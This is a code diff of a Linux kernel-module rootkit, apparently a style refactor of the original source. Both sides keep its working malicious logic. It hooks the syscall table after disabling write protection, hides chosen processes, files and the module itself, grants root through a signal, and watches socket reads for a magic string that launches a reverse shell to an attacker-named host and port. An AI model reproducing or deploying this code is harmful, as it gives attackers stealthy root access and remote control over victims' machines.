@@ -44,32 +44,30 @@ LIST_HEAD(hidden_processes);
 bool module_hidden;
 static struct list_head *prev_mod;
 
-uintptr_t *syscall_table;
+unsigned long *syscall_table;
 
-bool
-is_process_hidden(pid_t pid) {
+bool is_process_hidden(pid_t pid)
+{
     struct hidden_process *proc;
     list_for_each_entry(proc, &hidden_processes, list) {
-        if (proc->pid == pid) {
+        if (proc->pid == pid)
             return true;
-        }
     }
     return false;
 }
 
-bool
-hide_process(pid_t pid) {
-    struct hidden_process *proc = kmalloc(sizeof(uintptr_t), GFP_KERNEL);
-    if (proc == NULL || is_process_hidden(pid)) {
+bool hide_process(pid_t pid)
+{
+    struct hidden_process *proc = kmalloc(sizeof(unsigned long), GFP_KERNEL);
+    if (proc == NULL || is_process_hidden(pid))
         return false;
-    }
     proc->pid = pid;
     list_add(&proc->list, &hidden_processes);
     return true;
 }
 
-void
-unhide_process(pid_t pid) {
+void unhide_process(pid_t pid)
+{
     struct hidden_process *proc, *tmp;
     list_for_each_entry_safe(proc, tmp, &hidden_processes, list) {
         if (proc->pid == pid) {
@@ -79,8 +77,8 @@ unhide_process(pid_t pid) {
     }
 }
 
-void
-give_current_root(void) {
+void give_current_root(void)
+{
     struct cred *creds = prepare_creds();
     if (creds != NULL) {
         creds->uid.val = creds->gid.val = 0;
@@ -91,24 +89,24 @@ give_current_root(void) {
     }
 }
 
-bool
-is_hidden_dirent(char *d_name, bool proc) {
+bool is_hidden_dirent(char *d_name, bool proc)
+{
     return (proc && is_process_hidden(simple_strtoul(d_name, NULL, 10))) 
         || memcmp(MAGIC_PREFIX, d_name, strlen(MAGIC_PREFIX)) == 0;
 }
 
-asmlinkage int
-intercepted_getdents(unsigned int fd, struct linux_dirent __user *dirp, unsigned int count) {
+asmlinkage int intercepted_getdents(unsigned int fd, struct linux_dirent __user *dirp, unsigned int count)
+{
+    
+    /* Invoke our original getdents */
     int ret = orig_getdents(fd, dirp, count);
-    if (ret <= 0) {
+    if (ret <= 0)
         return ret;
-    }
 
     /* Create a kernel-space copy of our directory entries */
     struct linux_dirent *kdirp = kmalloc(ret, GFP_KERNEL);
-    if (kdirp == NULL) {
+    if (kdirp == NULL)
         return ret;
-    }
     if (copy_from_user(kdirp, dirp, ret) != 0) {
         kfree(kdirp);
         return ret;
@@ -141,18 +139,18 @@ intercepted_getdents(unsigned int fd, struct linux_dirent __user *dirp, unsigned
     return ret;
 }
 
-asmlinkage int
-intercepted_getdents64(unsigned int fd, struct linux_dirent64 __user *dirp, unsigned int count) {
+asmlinkage int intercepted_getdents64(unsigned int fd, struct linux_dirent64 __user *dirp, unsigned int count)
+{
+
+    /* Invoke our original getdents */
     int ret = orig_getdents64(fd, dirp, count);
-    if (ret <= 0) {
+    if (ret <= 0)
         return ret;
-    }
 
     /* Create a kernel-space copy of our directory entries */
     struct linux_dirent64 *kdirp = kmalloc(ret, GFP_KERNEL);
-    if (kdirp == NULL) {
+    if (kdirp == NULL)
         return ret;
-    }
     if (copy_from_user(kdirp, dirp, ret) != 0) {
         kfree(kdirp);
         return ret;
@@ -185,59 +183,57 @@ intercepted_getdents64(unsigned int fd, struct linux_dirent64 __user *dirp, unsi
     return ret;
 }
 
-void
-hide_module(void) {
+void hide_module(void)
+{
     if (!module_hidden) {
         prev_mod = THIS_MODULE->list.prev;
         list_del(&THIS_MODULE->list);
-        
         kfree(THIS_MODULE->sect_attrs);
         THIS_MODULE->sect_attrs = NULL;
         module_hidden = true;
     }
 }
 
-void
-unhide_module(void) {
+void unhide_module(void)
+{
     if (module_hidden) {
         list_add(&THIS_MODULE->list, prev_mod);
         module_hidden = false;
     }
 }
 
-asmlinkage int
-intercepted_kill(pid_t pid, int sig) {
+asmlinkage int intercepted_kill(pid_t pid, int sig)
+{
     switch (sig) {
-        case SIGNAL_HIDE_PROCESS:
-            hide_process(pid);
-            break;
-        case SIGNAL_UNHIDE_PROCESS:
-            unhide_process(pid);
-            break;
-        case SIGNAL_GIVE_ROOT:
-            give_current_root();
-            break;
-        case SIGNAL_UNHIDE_MODULE:
-            unhide_module();
-            break;
-        case SIGNAL_HIDE_MODULE:
-            hide_module();
-            break;
-        default:
-            return orig_kill(pid, sig);
+    case SIGNAL_HIDE_PROCESS:
+        hide_process(pid);
+        break;
+    case SIGNAL_UNHIDE_PROCESS:
+        unhide_process(pid);
+        break;
+    case SIGNAL_GIVE_ROOT:
+        give_current_root();
+        break;
+    case SIGNAL_UNHIDE_MODULE:
+        unhide_module();
+        break;
+    case SIGNAL_HIDE_MODULE:
+        hide_module();
+        break;
+    default:
+        return orig_kill(pid, sig);
     }
     return 0;
 }
 
-asmlinkage ssize_t
-intercepted_read(int fd, void __user *buf, size_t count) {
+asmlinkage ssize_t intercepted_read(int fd, void __user *buf, size_t count)
+{
     ssize_t ret = orig_read(fd, buf, count);
 
     /* Make sure our data both comes from a socket and can contain the backdoor magic */
     struct inode *in = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
-    if (ret <= 0 || ret < strlen(BACKDOOR_MAGIC) || !S_ISSOCK(in->i_mode)) {
+    if (ret <= 0 || ret < strlen(BACKDOOR_MAGIC) || !S_ISSOCK(in->i_mode))
         return ret;
-    }
 
     /* Attempt to find our backdoor's magic in the data */
     char *backdoor = NULL;
@@ -248,55 +244,57 @@ intercepted_read(int fd, void __user *buf, size_t count) {
         }
     }
 
-    if (backdoor != NULL) {
+    /* If we could not find our backdoor string in the data there's nothing to do */
+    if (backdoor == NULL)
+        return ret;
 
-        /* Create a kernel-space copy of the data that was read */
-        void *kbuf = kmalloc(ret, GFP_KERNEL);
-        if (kbuf == NULL) {
-            return ret;
-        }
-        if (copy_from_user(kbuf, buf, ret) != 0) {
-            kfree(kbuf);
-            return ret;
-        }
-
-        /* Find the same backdoor string in the kernel-space copy */
-        backdoor = kbuf + ((void*) backdoor - buf) + strlen(BACKDOOR_MAGIC) + 1; 
-
-        /* Attempt to parse out the target host and port */
-        char *host = backdoor, *port = NULL;
-        for (int i = 0; i < 1024; i++) {
-            if (backdoor[i] == ':') {
-                backdoor[i] = '\0';
-                port = backdoor + i + 1;
-            } else if (backdoor[i] == '}') {
-                backdoor[i] = '\0';
-                break;
-            }
-        }
-
-        /* Now we just invoke our reverse shell */
-        char *argv[] = { "/" MAGIC_PREFIX "-util/rev", host, port, NULL };
-        static char *envp[] = {"HOME=/", "TERM=linux", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
-        call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
-
-        /* Clean up the copied userspace data */
+    /* Create a kernel-space copy of the data that was read */
+    void *kbuf = kmalloc(ret, GFP_KERNEL);
+    if (kbuf == NULL)
+        return ret;
+    if (copy_from_user(kbuf, buf, ret) != 0) {
         kfree(kbuf);
+        return ret;
     }
+
+    /* Find the same backdoor string in the kernel-space copy */
+    backdoor = kbuf + ((void*) backdoor - buf) + strlen(BACKDOOR_MAGIC) + 1; 
+
+    /* Attempt to parse out the target host and port */
+    char *host = backdoor, *port = NULL;
+    for (int i = 0; i < 1024; i++) {
+        if (backdoor[i] == ':') {
+            backdoor[i] = '\0';
+            port = backdoor + i + 1;
+        } else if (backdoor[i] == '}') {
+            backdoor[i] = '\0';
+            break;
+        }
+    }
+
+    /* Now we just invoke our reverse shell */
+    char *argv[] = { "/" MAGIC_PREFIX "-util/rev", host, port, NULL };
+    static char *envp[] = {"HOME=/", "TERM=linux", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
+    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
+
+    /* Clean up the copied userspace data */
+    kfree(kbuf);
     return ret;
 }
 
-uintptr_t *
-find_syscall_table(void) {
-    uintptr_t *syscall_table = (uintptr_t*) sys_close;
-    while (syscall_table[__NR_close] != (uintptr_t) sys_close) {
+unsigned long *find_syscall_table(void)
+{
+    
+    /* Find the syscall table using an address known to be before it in memory */
+    unsigned long *syscall_table = (unsigned long*) sys_close;
+    while (syscall_table[__NR_close] != (unsigned long) sys_close) {
         syscall_table++;
     }
     return syscall_table;
 }
 
-static int __init
-ayylkmao_init(void) {
+static int __init ayylkmao_init(void)
+{
     syscall_table = find_syscall_table();
 
     /* Store our original system call addresses */
@@ -307,25 +305,25 @@ ayylkmao_init(void) {
 
     /* Replace them with our alien ones */
     write_cr0(read_cr0() & ~0x10000);
-    syscall_table[__NR_kill] = (uintptr_t) intercepted_kill;
-    syscall_table[__NR_getdents] = (uintptr_t) intercepted_getdents;
-    syscall_table[__NR_getdents64] = (uintptr_t) intercepted_getdents64;
-    syscall_table[__NR_read] = (uintptr_t) intercepted_read;
+    syscall_table[__NR_kill] = (unsigned long) intercepted_kill;
+    syscall_table[__NR_getdents] = (unsigned long) intercepted_getdents;
+    syscall_table[__NR_getdents64] = (unsigned long) intercepted_getdents64;
+    syscall_table[__NR_read] = (unsigned long) intercepted_read;
     write_cr0(read_cr0() | 0x10000);
-    
+
     hide_module();
     return 0;
 }
 
-static void __exit
-ayylkmao_uninit(void) {
+static void __exit ayylkmao_uninit(void)
+{
 
     /* Restore the syscall table to its original state */
     write_cr0(read_cr0() & ~0x10000);
-    syscall_table[__NR_kill] = (uintptr_t) orig_kill;
-    syscall_table[__NR_getdents] = (uintptr_t) orig_getdents;
-    syscall_table[__NR_getdents64] = (uintptr_t) orig_getdents64;
-    syscall_table[__NR_read] = (uintptr_t) orig_read;
+    syscall_table[__NR_kill] = (unsigned long) orig_kill;
+    syscall_table[__NR_getdents] = (unsigned long) orig_getdents;
+    syscall_table[__NR_getdents64] = (unsigned long) orig_getdents64;
+    syscall_table[__NR_read] = (unsigned long) orig_read;
     write_cr0(read_cr0() | 0x10000);
 }
 
